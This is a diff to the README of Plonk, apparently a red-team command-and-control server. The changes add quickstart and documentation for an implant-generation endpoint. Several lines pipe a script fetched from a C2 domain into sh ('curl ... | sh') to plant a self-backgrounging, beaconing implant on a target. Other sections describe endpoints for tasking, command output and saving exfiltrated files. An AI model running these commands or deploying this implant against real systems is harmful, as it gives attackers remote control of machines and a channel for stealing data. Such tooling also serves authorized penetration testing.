@@ -10,11 +10,22 @@ Quickstart
 ----------
 1. Start the C2 server
 ```bash
+# Build the server.  Alternatively, get hold af an already-built binary.
 go install github.com/magisterquis/plonk@latest
+
+# Plonk listen on port 443 by default.  On Linux, capabilities allow it to run
+# as a normal user.
+[[ "Linux" == "$(uname -s)" ]] && sudo setcap cap_net_bind_service+eip "$(which plonk)"
+
+# Start the server
 plonk -h
 plonk -letsencrypt c2domain.example.com
 ```
 2. Get an implant going on target
+```bash
+curl -s https://c2domain.example.com/c | sh
+```
+_...or..._
 ```bash
 while :; do
         curl -s https://c2domain.example.com/t/kittens |
@@ -26,7 +37,7 @@ done
 ```
 3. Tasking and output
 ```
-$ plonk -interact kittens
+$ plonk -interact -next- # Or an implant ID
 2023/05/23 22:20:14 Welcome.  Going interactive with kittens.
 uname -a
 2023/05/23 22:21:10 [TASKQ] Added task (queue length 1):
@@ -48,6 +59,7 @@ Features
 - Task output logging over HTTP(s)
 - Exfil sent over HTTP(s) saved to files
 - Simple interactive interface
+- Implant script generation
 
 Installation
 ------------
@@ -110,23 +122,68 @@ Saving exfil can be disabled with `-no-exfil`.
 
 Implants
 --------
-Plonk does not currently have any pre-built implants.  The Implant HTTP API
-(such as it is) is a follows:
+Plonk does not currently have much in the way of canned implants.  The Implant
+HTTP API (such as it is) is a follows:
 
 Default Endpoint | [Environment Variable](#Environment-Variables) | Description
------------------|------------------------------------------------|-
+-----------------|------------------------------------------------|------------
 `/f/<path>`      | `PLONK_FILESPREFIX`/`PLONK_STATICFILESDIR`     | Download a static file
 `/t/<ImplantID>` | `PLONK_TASKPREFIX`                             | Retrieve tasking
 `/o/<ImplantID>` | `PLONK_OUTPUTPREFIX`                           | Return output
 `/p/<ImplantID>` | `PLONX_EXFILPREFIX`/`PLONK_EXFILDIR`           | Save exfil to files
+`/c/`            | `PLONK_CLGENPREFIX`                            | Generate a cURL-in-a-loop script
 
 The `/<ImplantID>` above may be omitted for an IDless implant.  To interact
 with an IDless implant, `-task -` and `-interact -` may be used.  If more than
 one implant doesn't provide an ImplantID, tasking will go to whichever asks
 first.
 
-There are a few low-effort implants in
+There are also a few low-effort implants in
 [`implant_ideas.md`](./implant_ideas.md).
+
+Implant Generation
+------------------
+A quick-n-dirty, self-backgrounging script which runs cURL in a loop can be
+retrieved using the `/c` endpoint.  By default, it becaons every 5 seconds to
+the domain presented to Plonk either in the HTTP host header or, failing that
+the TLS SNI.
+
+### Request parameters
+
+The following may be set as URL or POST parameters to override script
+generation defaults.
+Parameter | Example                     | Description
+----------|-----------------------------|------------
+`c2url`   | `https://example.org:4342"` | Plonk's URL, less any path
+`cbint`   | `10m`                       | Beacon interval, rounded down to the nearest second
+
+Example:
+```sh
+curl -sv https://c2domain.example.com/c?c2url=c2domain.example.com&cbint=1h | sh
+```
+
+### C2 URL
+
+The C2 URL may also be sent as a Host header, prefixed with `http-` or
+`https-`, useful in calling back with a different protoctol than was used to
+grab the script.
+
+Example:
+```sh
+curl -H 'Host: https-c2domain.example.com' http://dl.example.com | sh
+```
+
+### Template
+
+The script is generated from a [template](https://pkg.go.dev/text/template) in
+`plonk.d/clgen.tmpl`.  This can be hot-reloaded by sending Plonk a SIGHUP.  The
+following parameters are passed to the template:
+
+Parameter   | Example                | Description
+------------|------------------------|------------
+`.RandN`    | `2aj1vpyx5glqi`        | Random base36 number, for ImplantID generation
+`.URL`      | `https://c2domain.com` | C2 URL for `/{t,o}/ImplantID`
+`.Interval` | `5`                    | Callback interval, in seconds
 
 Signals
 -------
@@ -140,6 +197,7 @@ SIGHUP causes the following:
   certificate updating with no downtime.
 - Seen implants are forgotten.  This is useful for logging the next callback
   of an implant which has already called back without using `-verbose`.
+- The cURL-in-a-loop template is re-read from `clgen.tmpl`.
 
 SIGUSR1 causes the following:
 - Generated self-signed certificates are written to disk.  This is useful for
@@ -172,6 +230,9 @@ Usage: plonk [options]
 
   Files and directories under plonk.d/files/ will served when Plonk gets a
   request for a path under /f/.
+
+  A quick-n-dirty implant script can be retrieved from /c.  By default, it
+  will call back to the protocol, domain, and port from which it was requested.
 
   C2 tasking is retrieved by a request to /t/<ImplantID>.  The /<ImplantID>
   may be empty; Plonk treats this as an IDless implant.  Tasking is stored in a
@@ -256,6 +317,7 @@ Variable               | Default        | Description
 `PLONK_STATICFILESDIR` | `files`        | Static files directory
 `PLONK_TASKFILE`       | `tasking.json` | Queued tasking file
 `PLONK_TASKPREFIX`     | `t`            | URL path prefix used by implants to request tasking
+`PLONK_CLGENPREFIX`    | `c`            | URL path prefix for generating a cURL in a loop implant script
 
 The list may also be printed with `-print-env`.
 
